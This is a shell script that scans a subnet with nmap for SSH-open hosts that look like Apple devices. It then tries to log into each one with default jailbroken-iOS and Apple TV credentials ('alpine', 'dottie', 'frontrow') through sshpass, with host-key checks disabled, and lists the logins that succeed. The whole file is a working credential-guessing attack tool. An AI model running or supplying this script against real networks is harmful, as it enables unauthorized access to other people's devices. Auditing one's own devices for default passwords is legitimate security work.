#!/bin/sh

if [ "$1" = "" ]; then
	echo "Usage: ./scanner.sh subnet"
	echo "Example: ./scanner.sh 192.168.1.0/24"
	echo
	echo "Make sure you have dependencies installed by running:"
	echo "sudo apt-get install nmap gawk openssh-client sshpass"
	exit
fi

if [ "$2" = "submode" ]; then
	host="$1"

	# >= iOS 1.1.x
	users=( "root" "mobile" )
	passwords=( "alpine" )

	# <= iOS 1.0.x
	# passwords+=( "dottie" )

	# Apple TV
	# users+=( "frontrow" )
	# passwords+=( "frontrow" )

	for user in ${users[@]}; do
	  	for password in ${passwords[@]}; do
			# echo "trying $user@$host:$password.."
			test=`sshpass -p "$password" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "$user@$host" "echo test" 2>/dev/null`

			if [ "$test" = "test" ]; then
				echo "$user@$host:$password"
				break
			fi
		done
	done

	exit
fi

subnet="$1"
outfile=`mktemp`
echo "[*] Scanning the network..."
nmap -sT -T4 -p22 --open -oN "$outfile" -- "$subnet" > /dev/null
hosts=`awk '{ FS="[()]"; if ($0 ~ /report/) { a=$2; getline; getline; getline; getline; if ($2 ~ /Apple/) {print a} } }' "$outfile"`
rm "$outfile"

if [ "$hosts" = "" ]; then
	echo "[-] Scan finished, no hosts found."
	exit
fi

echo "[+] Scan finished, ${#hosts[@]} host(s) found!"
echo "[*] Will now attempt to log in with default credentials."
echo "[*] Successful attempts will be shown on screen."

for host in ${hosts[@]}; do
	"$0" "$host" submode &
done

wait
